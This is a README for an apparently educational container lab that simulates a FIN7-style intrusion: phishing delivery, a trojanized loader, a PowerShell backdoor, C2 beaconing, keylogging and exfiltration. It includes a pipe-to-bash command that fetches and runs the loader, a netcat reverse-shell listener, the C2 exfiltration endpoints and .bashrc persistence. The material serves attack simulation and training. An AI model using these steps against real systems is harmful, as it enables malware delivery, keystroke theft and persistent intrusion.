# FIN7 Attack Simulation — Containernet

A container-based simulation of a FIN7-style intrusion. It covers network
reconnaissance, phishing delivery, an in-memory PowerShell backdoor
(POWERPLANT / KillACK), C2 beaconing, keylogging and credential exfiltration.

## Topology

```
attacker                         proxy                          victim
10.0.1.10/24 ─────── s1 ─────── 10.0.1.254/24
                                 10.0.2.254/24 ─────── s2 ─────── 10.0.2.20/24
```

| Node | IP | Role |
|------|----|------|
| `attacker` | `10.0.1.10/24` | Team server / C2 |
| `proxy` | `10.0.1.254/24`, `10.0.2.254/24` | Dual-homed redirector (`socat`) |
| `victim` | `10.0.2.20/24` | Target |

The proxy forwards:

- TCP `80` → `attacker:8443` (phishing page and C2)
- TCP `4444` → `attacker:4444` (reverse shell)

## Repository layout

```
fin7_topology.py             # network, routing, redirector and phase orchestration
Dockerfile                   # fin7-base image (tools + pwsh, no payloads)
Dockerfile.attacker          # fin7-attacker image (fin7-base + payloads at /opt/fin7)
setup.sh                     # builds both images
cleanup.sh                   # stops the topology and removes containers
attacker.sh                  # shell in mn.attacker
proxy.sh                     # shell in mn.proxy
victim.sh                    # shell in mn.victim, records keys to /tmp/keys.log
payloads/
├── c2_server.py             # HTTP team server on 0.0.0.0:8443
├── index.html               # phishing page ("Invoice 4471")
├── cybersecurity4dummies.sh # trojanized loader
├── cube.ps1                 # POWERPLANT stage-2 backdoor
└── task.ps1                 # task served on /task (keylog exfiltration)
```

The payloads are copied into the `fin7-attacker` image at `/opt/fin7` during the
Docker build. Only the attacker runs that image; the proxy and victim use
`fin7-base`, which does not contain the payloads. There is no bind mount, so
editing a payload requires rebuilding the images.

## Requirements

- Linux
- Docker
- Containernet available to Python (`from mininet.net import Containernet`)
- Root privileges for Mininet (`sudo`)

## Build

```bash
./setup.sh
```

Equivalent:

```bash
docker build -t fin7-base .
docker build -t fin7-attacker -f Dockerfile.attacker .
```

Verify that the payloads are only in the attacker image:

```bash
docker run --rm --entrypoint ls fin7-attacker -la /opt/fin7
docker run --rm --entrypoint stat fin7-attacker \
  -c '%A %a %n' /opt/fin7/cybersecurity4dummies.sh
# -rwxr-xr-x 755 /opt/fin7/cybersecurity4dummies.sh

docker run --rm --entrypoint ls fin7-base -la /opt
# /opt/fin7 should NOT exist here
```

## Run the topology

From the repository root:

```bash
./cleanup.sh
sudo python3 fin7_topology.py
```

Wait for `*** Network Ready!`. The script then enters the Mininet CLI. Useful
CLI commands:

```
mininet> nodes
mininet> dump
mininet> exit
```

Open separate terminals for the helper scripts:

```bash
./attacker.sh   # shell in mn.attacker
./proxy.sh      # shell in mn.proxy
./victim.sh     # shell in mn.victim, logs keystrokes to /tmp/keys.log
```

## Demo walkthrough

### 1. Reconnaissance

The topology already runs `nmap`. Inspect the results:

```bash
docker exec mn.attacker cat /tmp/recon_ping.txt
docker exec mn.attacker cat /tmp/recon_ports.txt
```

### 2. Verify the C2 server

```bash
docker exec mn.attacker cat /tmp/c2_logs.txt
docker exec mn.attacker ss -ltnp | grep 8443
```

You should see a `LISTEN` socket for `python3 /opt/fin7/c2_server.py`.

### 3. Delivery

In the victim shell:

```bash
curl -s http://10.0.2.254/
```

That returns the fake invoice page. Download and execute the loader:

```bash
curl -s http://10.0.2.254/download | bash
```

Or download it to disk first:

```bash
curl -s http://10.0.2.254/download -o /tmp/cybersecurity4dummies.sh
ls -l /tmp/cybersecurity4dummies.sh     # 0644: HTTP does not carry file modes
bash /tmp/cybersecurity4dummies.sh
```

To create the downloaded file directly as executable, without a separate
`chmod`:

```bash
curl -s http://10.0.2.254/download \
  | install -m 755 /dev/stdin /tmp/cybersecurity4dummies.sh

ls -l /tmp/cybersecurity4dummies.sh     # -rwxr-xr-x
/tmp/cybersecurity4dummies.sh
```

### 4. Reverse shell

Start the listener before running the loader:

```bash
docker exec -it mn.attacker nc -lnvp 4444
```

When the loader runs, the victim connects back through the proxy:

```
victim:4444 → proxy:4444 → attacker:4444
```

### 5. C2 and exfiltration

Watch server activity:

```bash
docker exec mn.attacker tail -f /tmp/c2_logs.txt
```

Expected callbacks include:

```
GET /cube.ps1
GET /gate?user=...&os=...&host=...&procs=...
GET /recon?data=...
GET /beacon?hostname=...
GET /task
POST /exfil
```

POSTed data is printed in the log:

```
[+] EXFILTRATED DATA RECEIVED:
...
```

### 6. Keylogging

`victim.sh` starts an interactive shell inside `script`, appending its output
to `/tmp/keys.log`. The backdoor polls `/task`, and `task.ps1` reads new data
from `/tmp/keys.log` and POSTs it to `/exfil`:

```bash
./victim.sh
# type something, then exit
docker exec mn.attacker tail -f /tmp/c2_logs.txt
```

## C2 endpoints

| Method | Path | Purpose |
|--------|------|---------|
| `GET` | `/` | Phishing page (`index.html`) |
| `GET` | `/download` | Loader (`cybersecurity4dummies.sh`) |
| `GET` | `/download/cybersecurity4dummies.sh` | Same loader, explicit name |
| `GET` | `/cube.ps1` | Stage-2 PowerShell backdoor |
| `GET` | `/task` | Task returned to the backdoor (`task.ps1`) |
| `GET` | `/gate`, `/recon`, `/beacon` | Logged callbacks |
| `POST` | `/exfil` | Logs exfiltrated data |

## Attack flow

1. **Reconnaissance** — the attacker scans `10.0.2.0/24` through the proxy.
2. **Weaponization** — the loader and backdoor are staged in the
   `fin7-attacker` image.
3. **Delivery** — the victim downloads and runs `cybersecurity4dummies.sh`.
4. **Exploitation** — the loader executes `cube.ps1` in memory with `pwsh`.
5. **Command & Control** — `cube.ps1` checks in and polls `/task`.
6. **Actions on objective** — keystrokes are captured and exfiltrated / hashes
   are POSTed to `/exfil`.
7. **Persistence** — the loader adds a `POWERPLANT_STAGE2` line to `.bashrc`
   and opens a reverse shell.

## Modifying payloads

Because payloads are baked into `fin7-attacker`:

```bash
# edit files under payloads/
./setup.sh
./cleanup.sh
sudo python3 fin7_topology.py
```

Running containers do not see payload changes until they are recreated.

If you prefer live editing instead, use `fin7-base` for the attacker and add a
bind mount:

```python
attacker = net.addDocker(
    "attacker",
    ip="10.0.1.10/24",
    dimage="fin7-base",
    volumes=[f"{PAYLOAD_DIR}:/opt/fin7:ro"],
)
```

Then remove `Dockerfile.attacker` from the build step. Use either the image copy
or the bind mount, not both — the mount shadows the image contents.

## Troubleshooting

### `curl: (52) Empty reply from server`

The proxy is accepting the connection but the attacker is not listening on
`8443`. Check:

```bash
docker exec mn.attacker cat /tmp/c2_logs.txt
docker exec mn.attacker ls -la /opt/fin7
docker exec mn.attacker ss -ltnp | grep 8443
```

Typical cause: `/opt/fin7/c2_server.py` is missing, meaning the attacker image
was not rebuilt after changing `Dockerfile.attacker`.

```bash
./setup.sh
./cleanup.sh
sudo python3 fin7_topology.py
```

### `Permission denied` when running a downloaded script

HTTP does not preserve the executable bit. Use one of:

```bash
bash /tmp/cybersecurity4dummies.sh
```

```bash
curl -s http://10.0.2.254/download \
  | install -m 755 /dev/stdin /tmp/cybersecurity4dummies.sh
```

```bash
chmod +x /tmp/cybersecurity4dummies.sh
```

### Stale containers or network state

```bash
./cleanup.sh
sudo python3 fin7_topology.py
```

### Payloads missing from the attacker image

```bash
docker run --rm --entrypoint ls fin7-attacker -la /opt/fin7
```

If `/opt/fin7` does not exist, rebuild:

```bash
./setup.sh
```

## Cleanup

```bash
./cleanup.sh
```

`cleanup.sh` performs:

```bash
sudo pkill -f fin7_topology.py
sudo mn -c
docker rm -f mn.attacker mn.proxy mn.victim 2>/dev/null
```

The images are kept; remove them manually if needed:

```bash
docker rmi fin7-attacker fin7-base
```
